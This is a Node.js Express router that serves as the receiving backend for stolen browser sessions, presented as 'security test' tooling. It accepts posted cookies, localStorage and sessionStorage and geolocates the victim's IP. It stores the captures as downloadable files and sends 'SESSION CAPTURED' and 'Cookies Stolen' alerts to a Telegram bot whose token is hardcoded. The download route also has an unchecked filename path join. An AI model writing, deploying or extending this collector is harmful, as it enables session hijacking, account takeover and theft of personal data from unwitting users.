const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../data/cookies');

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
    console.log('Created data directory:', COOKIES_DIR);
  }
}

// Telegram message sending function
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Sending Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message
    };
  }
}

// Function to create data file
async function createDataFile(data) {
  await ensureDataDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const testType = data.type || 'security_test';
  const filename = `${testType}_${timestamp}.json`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  // Save complete data as JSON
  await fs.writeFile(filepath, JSON.stringify(data, null, 2));
  console.log('Data file created:', filename);
  return { filename, filepath };
}

// Format data for Telegram based on test type
function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
  const { type, metadata = {} } = data;
  
  let message = '';
  const timestamp = new Date().toISOString();

  switch(type) {
    case 'session_capture':
      const sessionData = data.data || {};
      const cookies = sessionData.cookies || {};
      const localStorage = sessionData.localStorage || {};
      const sessionStorage = sessionData.sessionStorage || {};
      
      message = `🎯 <b>SESSION CAPTURED</b>

🌐 <b>Target:</b> ${sessionData.url || 'N/A'}
📊 <b>Cookies:</b> ${Object.keys(cookies).length}
🍪 <b>Cookie Names:</b> ${Object.keys(cookies).join(', ') || 'None'}
💾 <b>Local Storage:</b> ${Object.keys(localStorage).length}
🔐 <b>Session Storage:</b> ${Object.keys(sessionStorage).length}
🕒 <b>Time:</b> ${sessionData.timestamp || timestamp}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Info:</b>
├ Project: ${metadata.project || 'N/A'}
├ Reference: ${metadata.reference || 'N/A'}
└ Scope: ${metadata.scope || 'N/A'}

📥 <b>Download Full Data:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
      break;

    case 'session_replay':
      message = `🔄 <b>SESSION REPLAY TEST</b>

📊 <b>Endpoints Tested:</b> ${data.data?.length || 0}
✅ <b>Successful:</b> ${data.data?.filter(r => r.authenticated).length || 0}
❌ <b>Failed:</b> ${data.data?.filter(r => !r.authenticated).length || 0}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
      break;

    case 'cookie_exfiltration_test':
    case 'xss_simulation':
      const exfilData = data.dataCollected || data.data || {};
      message = `🍪 <b>XSS EXFILTRATION SIMULATION</b>

📊 <b>Cookies Stolen:</b> ${exfilData.cookies ? Object.keys(exfilData.cookies).length : 0}
🔗 <b>Target URL:</b> ${exfilData.url || 'N/A'}
🕒 <b>Time:</b> ${exfilData.timestamp || timestamp}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

⚠️ <b>Vulnerable Cookies:</b> ${data.vulnerableCookies ? data.vulnerableCookies.length : 0}
📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
      break;

    case 'session_fixation':
      message = `🎭 <b>SESSION FIXATION TEST</b>

🔐 <b>Fixation ID:</b> <code>${data.data?.fixationId || 'N/A'}</code>
✅ <b>Cookie Set:</b> ${data.data?.cookieSet ? 'Yes' : 'No'}
📊 <b>Tests Run:</b> ${data.data?.testResults?.length || 0}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
      break;

    case 'cookie_injection':
      message = `⚡ <b>COOKIE INJECTION TEST</b>

📊 <b>Cookies Injected:</b> ${data.data?.length || 0}
✅ <b>Successful:</b> ${data.data?.filter(r => r.injectionSuccessful).length || 0}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
      break;

    case 'complete_assessment':
      const findings = data.data?.summary || {};
      message = `📊 <b>COMPLETE SECURITY ASSESSMENT</b>

🎯 <b>Target:</b> ${findings.targetUrl || 'N/A'}
⚠️ <b>Vulnerabilities:</b> ${findings.totalVulnerabilities || 0}
🔴 <b>Risk Level:</b> ${findings.riskLevel || 'N/A'}

📋 <b>Findings:</b>
${findings.vulnerabilities ? findings.vulnerabilities.map(v => `├ ${v}`).join('\n') : '├ No vulnerabilities found'}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}
📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
      break;

    case 'stealth_exfiltration':
      message = `🕵️ <b>STEALTH EXFILTRATION TEST</b>

📊 <b>Cookies Available:</b> ${data.data?.cookieCount || 0}
⚠️ <b>Vulnerable:</b> ${data.data?.vulnerable ? 'Yes' : 'No'}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
      break;

    default:
      message = `📡 <b>SECURITY TEST DATA RECEIVED</b>

📊 <b>Type:</b> ${type || 'unknown'}
🔗 <b>URL:</b> ${data.url || data.data?.url || 'N/A'}
🕒 <b>Time:</b> ${timestamp}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}
📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
  }

  return message;
}

// ==================== DOWNLOAD ROUTES ====================

// File download route
router.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(COOKIES_DIR, filename);
    
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found"
      });
    }
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    res.send(fileContent);
    
  } catch (error) {
    console.error('Error downloading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file"
    });
  }
});

// List all data files
router.get('/files', async (req, res) => {
  try {
    await ensureDataDir();
    const files = await fs.readdir(COOKIES_DIR);
    const dataFiles = files.filter(file => file.endsWith('.json'));
    
    // Get file stats
    const filesWithStats = await Promise.all(
      dataFiles.map(async (file) => {
        try {
          const stats = await fs.stat(path.join(COOKIES_DIR, file));
          return {
            filename: file,
            downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
            size: stats.size,
            created: stats.birthtime
          };
        } catch (error) {
          return {
            filename: file,
            downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
            size: 'N/A',
            created: 'N/A'
          };
        }
      })
    );
    
    res.json({
      success: true,
      totalFiles: filesWithStats.length,
      files: filesWithStats
    });
  } catch (error) {
    console.error('Error listing files:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error listing files"
    });
  }
});

// Clear all data files (for testing)
router.delete('/files', async (req, res) => {
  try {
    await ensureDataDir();
    const files = await fs.readdir(COOKIES_DIR);
    
    let deletedCount = 0;
    for (const file of files) {
      if (file.endsWith('.json')) {
        await fs.unlink(path.join(COOKIES_DIR, file));
        deletedCount++;
      }
    }
    
    res.json({
      success: true,
      message: `Deleted ${deletedCount} data files`,
      deletedCount: deletedCount
    });
    
  } catch (error) {
    console.error('Error clearing files:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error clearing files"
    });
  }
});

// Get file content by filename
router.get('/file/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(COOKIES_DIR, filename);
    
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found"
      });
    }
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    const data = JSON.parse(fileContent);
    
    res.json({
      success: true,
      filename: filename,
      data: data
    });
    
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error reading file"
    });
  }
});

// Debug route to see latest session data
router.get('/debug/latest', async (req, res) => {
  try {
    await ensureDataDir();
    const files = await fs.readdir(COOKIES_DIR);
    const jsonFiles = files.filter(file => file.endsWith('.json')).sort().reverse();
    
    if (jsonFiles.length === 0) {
      return res.json({ message: "No data files found" });
    }
    
    const latestFile = jsonFiles[0];
    const filepath = path.join(COOKIES_DIR, latestFile);
    const fileContent = await fs.readFile(filepath, 'utf8');
    const data = JSON.parse(fileContent);
    
    res.json({
      filename: latestFile,
      data: data,
      sessionData: data.type === 'session_capture' ? {
        cookiesCount: Object.keys(data.data?.cookies || {}).length,
        cookieNames: Object.keys(data.data?.cookies || {}),
        localStorageCount: Object.keys(data.data?.localStorage || {}).length,
        sessionStorageCount: Object.keys(data.data?.sessionStorage || {}).length,
        url: data.data?.url
      } : null
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Debug route to see all files
router.get('/debug/files', async (req, res) => {
  try {
    await ensureDataDir();
    const files = await fs.readdir(COOKIES_DIR);
    const jsonFiles = files.filter(file => file.endsWith('.json')).sort().reverse();
    
    const filesWithData = await Promise.all(
      jsonFiles.map(async (file) => {
        try {
          const filepath = path.join(COOKIES_DIR, file);
          const fileContent = await fs.readFile(filepath, 'utf8');
          const data = JSON.parse(fileContent);
          
          return {
            filename: file,
            type: data.type,
            timestamp: data.timestamp || data.data?.timestamp,
            cookies: data.data?.cookies ? Object.keys(data.data.cookies).length : 0,
            url: data.url || data.data?.url
          };
        } catch (error) {
          return {
            filename: file,
            error: error.message
          };
        }
      })
    );
    
    res.json({
      totalFiles: filesWithData.length,
      files: filesWithData
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// MAIN ENDPOINT - Data collection with Telegram
router.post('/', async (req, res) => {
  try {
    console.log('=== SECURITY TEST DATA RECEIVED ===');
    
    // Validate request body
    if (!req.body || typeof req.body !== 'object') {
      console.log('Invalid request body received');
      return res.status(400).json({ 
        success: false, 
        message: "Invalid request body" 
      });
    }
    
    // Safe logging
    console.log('Data type:', req.body.type || 'undefined');
    console.log('Data keys:', Object.keys(req.body));

    const data = req.body;
    
    // Get client information
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // Parse user agent
    const userAgent = data.userAgent || data.user_agent || req.headers['user-agent'] || '';
    const parser = new UAParser(userAgent);
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create data file
    let fileInfo = null;
    try {
      fileInfo = await createDataFile(data);
    } catch (fileError) {
      console.error('Error creating data file:', fileError);
    }

    // Build Telegram message based on data type
    const telegramMessage = formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo);

    // Send to Telegram
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(telegramMessage);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Log to console for monitoring
    console.log('📥 New Security Test Data:');
    console.log('   Type:', data.type || 'unknown');
    console.log('   IP:', ip);
    console.log('   Location:', locationStr);
    console.log('   Device:', deviceType);
    console.log('   URL:', data.url || data.data?.url || 'N/A');

    // DETAILED SESSION LOGGING
    if (data.type === 'session_capture') {
      console.log('   🍪 SESSION CAPTURE DETAILS:');
      console.log('      Cookies:', Object.keys(data.data?.cookies || {}).length);
      console.log('      Cookie Names:', Object.keys(data.data?.cookies || {}));
      console.log('      Local Storage:', Object.keys(data.data?.localStorage || {}).length);
      console.log('      Session Storage:', Object.keys(data.data?.sessionStorage || {}).length);
      console.log('      Timestamp:', data.data?.timestamp);
    } else if (data.cookies || data.data?.cookies) {
      const cookieCount = data.cookies ? Object.keys(data.cookies).length : 
                         data.data?.cookies ? Object.keys(data.data.cookies).length : 0;
      console.log('   Cookies:', cookieCount);
    }
    
    if (data.metadata) {
      console.log('   Test Reference:', data.metadata.reference || 'N/A');
    }

    // Return success response WITH DOWNLOAD INFO
    res.status(200).json({
      success: true,
      message: "Security test data received successfully",
      dataType: data.type,
      telegramSent: telegramResult.success,
      clientInfo: {
        ip: ip,
        location: locationStr,
        device: deviceType
      },
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`,
        fullPath: fileInfo.filepath
      } : null,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error("Error in security test endpoint:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// Health check endpoint
router.get('/health', async (req, res) => {
  try {
    await ensureDataDir();
    
    res.json({
      success: true,
      message: "Security test endpoint is running",
      timestamp: new Date().toISOString(),
      features: {
        dataCollection: true,
        telegramNotifications: !!TELEGRAM_API,
        fileStorage: true,
        downloadEndpoint: true
      },
      storage: {
        directory: COOKIES_DIR,
        exists: true
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Health check failed",
      error: error.message
    });
  }
});

module.exports = router;